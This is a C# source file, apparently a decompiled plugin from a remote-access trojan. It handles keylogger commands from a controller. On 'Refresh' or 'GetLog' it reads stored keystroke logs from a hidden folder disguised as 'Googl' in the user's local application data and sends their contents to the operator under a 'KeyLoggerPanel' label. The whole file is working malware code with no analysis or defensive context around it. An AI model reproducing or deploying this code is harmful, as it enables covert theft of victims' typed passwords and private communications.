using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using Leb128;
using Plugin.Helper;

namespace Plugin;

internal class Packet
{
	public static void Read(byte[] data)
	{
		try
		{
			object[] array = LEB128.Read(data);
			string text = (string)array[0];
			if (!(text == "Refresh"))
			{
				if (text == "GetLog")
				{
					GetLog((string)array[1]);
				}
			}
			else
			{
				GetLogs();
			}
		}
		catch (Exception ex)
		{
			Client.Error(ex.ToString());
		}
	}

	public static void GetLog(string name)
	{
		StringBuilder stringBuilder = new StringBuilder();
		string[] array = name.Split(new char[1] { ',' });
		foreach (string text in array)
		{
			stringBuilder.AppendLine(File.ReadAllText(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Googl", text + ".txt")) + "\n\n");
		}
		Client.Send(LEB128.Write(new object[3]
		{
			"KeyLoggerPanel",
			"Log",
			stringBuilder.ToString()
		}));
	}

	public static void GetLogs()
	{
		List<string> list = new List<string> { "KeyLoggerPanel", "List" };
		string[] files = Directory.GetFiles(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Googl"));
		foreach (string path in files)
		{
			list.Add(Path.GetFileNameWithoutExtension(path));
		}
		object[] data = list.ToArray();
		Client.Send(LEB128.Write(data));
	}
}
